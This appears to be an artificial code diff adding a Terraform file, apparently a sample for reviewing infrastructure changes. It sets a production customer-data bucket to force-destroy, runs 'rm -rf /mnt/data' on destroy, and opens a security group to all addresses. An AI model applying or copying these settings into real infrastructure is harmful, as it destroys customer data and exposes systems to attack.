@@ -1,0 +1,21 @@
+diff --git a/terraform/storage.tf b/terraform/storage.tf
+new file mode 100644
+index 0000000..4444444
+--- /dev/null
++++ b/terraform/storage.tf
+@@ -0,0 +1,16 @@
++resource "aws_s3_bucket" "data" {
++  bucket        = "prod-customer-data"
++  force_destroy = true
++
++  provisioner "local-exec" {
++    when    = destroy
++    command = "rm -rf /mnt/data"
++  }
++}
++
++resource "aws_security_group" "wide_open" {
++  ingress {
++    cidr_blocks = ["0.0.0.0/0"]
++  }
++}
